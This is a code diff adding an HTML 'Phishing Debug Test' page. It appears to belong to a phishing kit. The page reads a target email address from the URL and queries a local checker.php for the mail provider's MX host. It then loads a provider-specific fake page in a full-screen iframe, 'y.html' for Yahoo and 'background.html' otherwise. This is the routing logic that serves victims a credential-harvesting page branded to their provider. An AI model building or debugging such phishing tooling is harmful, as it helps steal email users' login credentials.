@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phishing Debug Test</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+<body style="margin:0;">
+    <div id="loader" style="position:fixed;top:0;left:0;right:0;bottom:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;">
+        <div>Debugging...</div>
+    </div>
+    <iframe id="fil" style="width:100%;height:100vh;border:none;"></iframe>
+    
+    <script>
+        // Manual config
+        var config = {
+            baseCheckUrl: 'http://localhost/phishing'
+        };
+        
+        var email = new URLSearchParams(window.location.search).get('cms') || 'user@yahoo.com';
+        console.log('Testing email:', email);
+        
+        // Test checker.php directly
+        $.ajax({
+            url: config.baseCheckUrl + '/checker.php',
+            data: {dom: email},
+            dataType: 'json',
+            success: function(response) {
+                console.log('checker.php response:', response);
+                
+                if (response.success === 'mta5.am0.yahoodns.net') {
+                    console.log('✓ SUCCESS: Loading Yahoo page');
+                    $('#fil').attr('src', 'y.html?cms=' + email);
+                } else {
+                    console.error('✗ FAILED: Got', response.success, 'expected mta5.am0.yahoodns.net');
+                    $('#fil').attr('src', 'background.html?cms=' + email);
+                }
+                
+                $('#loader').hide();
+            },
+            error: function(xhr, status, error) {
+                console.error('AJAX ERROR:', status, error);
+                console.error('Response:', xhr.responseText);
+                $('#loader').html('AJAX Error: ' + error).show();
+            }
+        });
+    </script>
+</body>
+</html>
